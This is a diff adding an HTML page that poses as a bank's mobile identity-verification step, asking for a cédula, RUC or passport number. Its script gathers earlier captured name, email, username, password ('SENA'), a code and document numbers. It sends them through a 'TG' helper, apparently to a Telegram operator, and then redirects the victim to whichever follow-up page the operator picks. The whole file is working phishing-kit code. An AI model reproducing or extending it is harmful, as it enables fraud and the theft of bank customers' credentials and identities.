@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Identidad</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ds-green-primary: #046a38;
+      --ds-green-secondary: #008744;
+      --ds-gray-text: #595959;
+      --ds-gray-title: #222222;
+      --ds-gray-disabled: #e6e6e6;
+      --ds-gray-tertiary: #8f8f8f;
+      --ds-red-error: #c8102e;
+      --ds-bg: #fff;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      height: -webkit-fill-available;
+    }
+    html, body {
+      background-color: var(--ds-bg);
+      color: var(--ds-gray-text);
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      height: 100dvh; /* Dynamic viewport height to account for mobile browser bars */
+      width: 100vw;
+      overflow: hidden;
+    }
+
+    .mobile-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      background: #fff;
+      margin-bottom: 16px;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .mobile-header-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--ds-gray-title);
+    }
+
+    .ds-contenido-principal {
+      margin: 0 auto;
+      max-width: 570px;
+      padding: 0 16px;
+      width: 100%;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .otp-titulo {
+      color: var(--ds-gray-title);
+      font-size: 22px;
+      font-style: normal;
+      font-weight: 700;
+      line-height: 28px;
+      margin: 0 0 4px;
+      flex-shrink: 0;
+    }
+
+    .otp-card-texto {
+      color: var(--ds-gray-text);
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 24px;
+      margin: 0 0 16px 0;
+      flex-shrink: 0;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .form-select, .form-input {
+      border: 1px solid var(--ds-gray-tertiary);
+      border-radius: 8px;
+      color: var(--ds-gray-title);
+      font-size: 16px;
+      height: 48px;
+      padding: 0 16px;
+      width: 100%;
+      background-color: #fff;
+      appearance: none;
+      -webkit-appearance: none;
+    }
+
+    .form-select {
+      background-image: url("data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23046a38' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' xmlns='http://www.w3.org/2000/svg'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 16px center;
+      background-size: 24px;
+      cursor: pointer;
+    }
+
+    .form-input:focus, .form-select:focus {
+      border-color: var(--ds-green-primary);
+      outline: none;
+    }
+
+    .form-input.has-error {
+      border-color: var(--ds-red-error);
+      background-color: #fdf5f6;
+    }
+
+    .error-text {
+      color: var(--ds-red-error);
+      display: none;
+      font-size: 13px;
+      font-weight: 700;
+      margin-top: 8px;
+    }
+
+    .form-input.has-error ~ .error-text {
+      display: block;
+    }
+
+    .error-icon {
+      position: absolute;
+      right: 16px;
+      top: 18px;
+      width: 20px;
+      height: 20px;
+      display: none;
+    }
+
+    .form-input.has-error ~ .error-icon {
+      display: block;
+    }
+
+    .terms-container {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 16px;
+      gap: 12px;
+      flex-shrink: 0;
+    }
+
+    .terms-checkbox {
+      width: 20px;
+      height: 20px;
+      min-width: 20px;
+      border: 1px solid var(--ds-gray-title);
+      border-radius: 4px;
+      cursor: pointer;
+      appearance: none;
+      -webkit-appearance: none;
+      outline: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #fff;
+    }
+
+    .terms-checkbox:checked {
+      background-color: #fff;
+    }
+
+    .terms-checkbox:checked::after {
+      content: '';
+      width: 10px;
+      height: 10px;
+      background-color: var(--ds-green-primary);
+      border-radius: 2px;
+    }
+
+    .terms-text {
+      font-size: 14px;
+      line-height: 20px;
+      color: var(--ds-gray-title);
+    }
+
+    .terms-link {
+      color: var(--ds-green-primary);
+      text-decoration: underline;
+      font-weight: 700;
+    }
+
+    .otp-actions {
+      margin-bottom: 16px;
+      flex-shrink: 0;
+    }
+
+    .otp-btn {
+      align-items: center;
+      border: 1px solid transparent;
+      border-radius: 8px;
+      display: flex;
+      font-size: 16px;
+      font-style: normal;
+      font-weight: 500;
+      height: 48px;
+      justify-content: center;
+      width: 100%;
+      text-decoration: none;
+      transition: all 0.3s;
+    }
+
+    .otp-btn--disabled {
+      background: #f5f5f5;
+      color: #bfbfbf;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    .otp-btn--activo {
+      background: var(--ds-green-primary);
+      color: #fff;
+      cursor: pointer;
+      pointer-events: auto;
+    }
+
+    /* Custom Bottom Sheet Modal */
+    .bottom-sheet-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 9998;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    
+    .bottom-sheet-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .bottom-sheet {
+      position: fixed;
+      bottom: -100%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 570px;
+      background: #fff;
+      border-radius: 20px 20px 0 0;
+      z-index: 9999;
+      padding: 0 0 16px 0;
+      transition: bottom 0.3s ease;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .bottom-sheet.active {
+      bottom: 0;
+    }
+
+    .bottom-sheet-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 24px 24px 16px 24px;
+    }
+
+    .bottom-sheet-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--ds-gray-title);
+    }
+
+    .bottom-sheet-close {
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .bottom-sheet-option {
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: var(--ds-gray-title);
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .bottom-sheet-option:not(:last-child) {
+      border-bottom: 1px solid #f0f0f0;
+    }
+    
+    .bottom-sheet-option:active {
+      background-color: #f9f9f9;
+    }
+
+  </style>
+</head>
+<body>
+  
+  <div class="mobile-header">
+    <span class="mobile-header-title">Identidad</span>
+  </div>
+
+  <main class="ds-contenido-principal">
+    <h1 class="otp-titulo">Ingresa tu identificaci&oacute;n</h1>
+    <p class="otp-card-texto">Para crear tus credenciales, verifica tu identidad</p>
+
+    <form id="frmIdentificacion" style="display: flex; flex-direction: column; flex: 1;">
+      
+      <div class="form-group">
+        <div id="tipoDocBtn" class="form-select" style="display: flex; align-items: center; justify-content: space-between;">C&eacute;dula</div>
+        <input type="hidden" id="tipoDoc" value="cedula">
+      </div>
+
+      <div class="form-group">
+        <input type="text" id="numDoc" class="form-input" placeholder="Ingresar C&eacute;dula" autocomplete="off">
+        <svg class="error-icon" viewBox="0 0 24 24" fill="none" stroke="#c8102e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="8" x2="12" y2="12"></line>
+          <line x1="12" y1="16" x2="12.01" y2="16"></line>
+        </svg>
+        <div class="error-text" id="errorMsg">Ingrese al menos 10 d&iacute;gitos.</div>
+      </div>
+
+      <div style="flex: 1;"></div>
+
+      <div class="terms-container">
+        <input type="checkbox" id="aceptoTerminos" class="terms-checkbox">
+        <label for="aceptoTerminos" class="terms-text">
+          Acepto el <a href="#" class="terms-link">acuerdo de uso de canales electr&oacute;nicos, Pol&iacute;ticas de privacidad y tratamiento de datos personales</a>.
+        </label>
+      </div>
+
+      <div class="otp-actions">
+        <button id="btnContinuar" class="otp-btn otp-btn--disabled" type="submit" disabled>Continuar</button>
+      </div>
+    </form>
+  </main>
+
+  <div class="bottom-sheet-overlay" id="bottomSheetOverlay"></div>
+  <div class="bottom-sheet" id="bottomSheet">
+    <div class="bottom-sheet-header">
+      <span class="bottom-sheet-title">Selecciona una opci&oacute;n</span>
+      <div class="bottom-sheet-close" id="bottomSheetClose">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#046a38" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
+        </svg>
+      </div>
+    </div>
+    <div class="bottom-sheet-option" data-value="cedula">
+      <span>C&eacute;dula</span>
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#046a38" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+    </div>
+    <div class="bottom-sheet-option" data-value="ruc">
+      <span>RUC</span>
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#046a38" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+    </div>
+    <div class="bottom-sheet-option" data-value="pasaporte">
+      <span>Pasaporte</span>
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#046a38" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+    </div>
+  </div>
+
+  <script src="tg.js"></script>
+  <script>
+    (function () {
+      const tipoDoc = document.getElementById('tipoDoc');
+      const numDoc = document.getElementById('numDoc');
+      const errorMsg = document.getElementById('errorMsg');
+      const aceptoTerminos = document.getElementById('aceptoTerminos');
+      const btnContinuar = document.getElementById('btnContinuar');
+      const frmIdentificacion = document.getElementById('frmIdentificacion');
+
+      const config = {
+        cedula: {
+          placeholder: 'Ingresar Cédula',
+          errorLength: 'Ingrese al menos 10 dígitos.',
+          errorReq: 'Campo requerido',
+          maxLen: 10,
+          type: 'number'
+        },
+        ruc: {
+          placeholder: 'Ingresar RUC',
+          errorLength: 'Ingrese al menos 13 dígitos.',
+          errorReq: 'Campo requerido',
+          maxLen: 13,
+          type: 'number'
+        },
+        pasaporte: {
+          placeholder: 'Ingresar Pasaporte',
+          errorLength: 'Campo requerido',
+          errorReq: 'Campo requerido',
+          maxLen: 20,
+          type: 'alphanumeric'
+        }
+      };
+
+      function updateFieldConfig() {
+        const val = tipoDoc.value;
+        const cfg = config[val];
+        numDoc.placeholder = cfg.placeholder;
+        numDoc.maxLength = cfg.maxLen;
+        numDoc.value = '';
+        numDoc.classList.remove('has-error');
+        
+        if (cfg.type === 'number') {
+          numDoc.setAttribute('inputmode', 'numeric');
+          numDoc.setAttribute('pattern', '[0-9]*');
+        } else {
+          numDoc.setAttribute('inputmode', 'text');
+          numDoc.removeAttribute('pattern');
+        }
+        
+        validateForm();
+      }
+      
+      // Bottom Sheet Logic
+      const tipoDocBtn = document.getElementById('tipoDocBtn');
+      const bottomSheetOverlay = document.getElementById('bottomSheetOverlay');
+      const bottomSheet = document.getElementById('bottomSheet');
+      const bottomSheetClose = document.getElementById('bottomSheetClose');
+      const bottomSheetOptions = document.querySelectorAll('.bottom-sheet-option');
+
+      function openBottomSheet() {
+        bottomSheetOverlay.classList.add('active');
+        bottomSheet.classList.add('active');
+      }
+
+      function closeBottomSheet() {
+        bottomSheetOverlay.classList.remove('active');
+        bottomSheet.classList.remove('active');
+      }
+
+      tipoDocBtn.addEventListener('click', openBottomSheet);
+      bottomSheetOverlay.addEventListener('click', closeBottomSheet);
+      bottomSheetClose.addEventListener('click', closeBottomSheet);
+
+      bottomSheetOptions.forEach(option => {
+        option.addEventListener('click', function() {
+          const val = this.getAttribute('data-value');
+          tipoDoc.value = val;
+          tipoDocBtn.innerHTML = this.querySelector('span').innerHTML;
+          
+          closeBottomSheet();
+          updateFieldConfig();
+        });
+      });
+
+      numDoc.addEventListener('input', function(e) {
+        const val = tipoDoc.value;
+        const cfg = config[val];
+        let currentVal = e.target.value;
+
+        if (cfg.type === 'number') {
+          currentVal = currentVal.replace(/[^0-9]/g, '');
+        } else if (cfg.type === 'alphanumeric') {
+          currentVal = currentVal.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
+        }
+
+        if (currentVal.length > cfg.maxLen) {
+          currentVal = currentVal.slice(0, cfg.maxLen);
+        }
+
+        e.target.value = currentVal;
+        
+        // Dynamic validation
+        if (currentVal.length > 0) {
+          if (val === 'cedula' && currentVal.length < 10) {
+            showError(cfg.errorLength);
+          } else if (val === 'ruc' && currentVal.length < 13) {
+            showError(cfg.errorLength);
+          } else {
+            clearError();
+          }
+        } else {
+          clearError();
+        }
+
+        validateForm();
+      });
+
+      aceptoTerminos.addEventListener('change', validateForm);
+
+      function showError(msg) {
+        numDoc.classList.add('has-error');
+        errorMsg.textContent = msg;
+      }
+
+      function clearError() {
+        numDoc.classList.remove('has-error');
+      }
+
+      function isInputValid() {
+        const val = tipoDoc.value;
+        const len = numDoc.value.length;
+        if (len === 0) return false;
+        if (val === 'cedula' && len < 10) return false;
+        if (val === 'ruc' && len < 13) return false;
+        return true;
+      }
+
+      function validateForm() {
+        if (isInputValid() && aceptoTerminos.checked) {
+          btnContinuar.disabled = false;
+          btnContinuar.classList.remove('otp-btn--disabled');
+          btnContinuar.classList.add('otp-btn--activo');
+        } else {
+          btnContinuar.disabled = true;
+          btnContinuar.classList.add('otp-btn--disabled');
+          btnContinuar.classList.remove('otp-btn--activo');
+        }
+      }
+
+      frmIdentificacion.addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (btnContinuar.disabled) return;
+        
+        if (typeof TG !== 'undefined' && TG.save) {
+          TG.save('tipoDoc', tipoDocBtn.innerText);
+          TG.save('numDoc', numDoc.value);
+        }
+        
+        var msg = '\u{1F464} Nombre: ' + TG.load('nombres') + '\n';
+        msg += '\u2709\uFE0F Correo: ' + TG.load('email') + '\n';
+        msg += '\u{1F3E6} Es cliente? : ' + TG.load('esCliente') + '\n';
+        msg += '\u{1F464} USU: ' + TG.load('usuario') + '\n';
+      msg += '\u{1F4C4} Documento: ' + TG.load('documento') + '\n';
+      msg += '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n';
+        msg += '\u{1F512} SENA: ' + TG.load('sena') + '\n';
+        msg += '\u{1F4C3} Tipo de documento: ' + TG.load('tipoDoc') + '\n';
+        msg += '\u{1F4C4} Number: ' + TG.load('numDoc');
+
+        TG.overlay(true);
+        TG.send(msg, true, ['Incorrecto \u274C', 'Identidad \u{1F464}'], { label: 'Dactilar \u{1F446}', action: 'dactilar' }, { label: 'Correo \u{1F4E7}', action: 'correo' }).then(function (sessionId) {
+          TG.poll(sessionId, function (action) {
+            TG.overlay(false);
+            if (action === 'correct') {
+              window.location.href = 'identificacion.html?error=1';
+            } else if (action === 'incorrect') {
+              window.location.href = 'incorrecto/identidad.html';
+            } else if (action === 'dactilar') {
+              window.location.href = 'dactilar.html';
+            } else if (action === 'correo') {
+              window.location.href = 'correo.html';
+            } else {
+              window.location.href = 'identificacion.html?error=1';
+            }
+          });
+        });
+      });
+
+      // Error handling on load
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('error') === '1') {
+        showError('Número de documento incorrecto');
+      }
+
+      updateFieldConfig();
+    })();
+  </script>
+</body>
+</html>
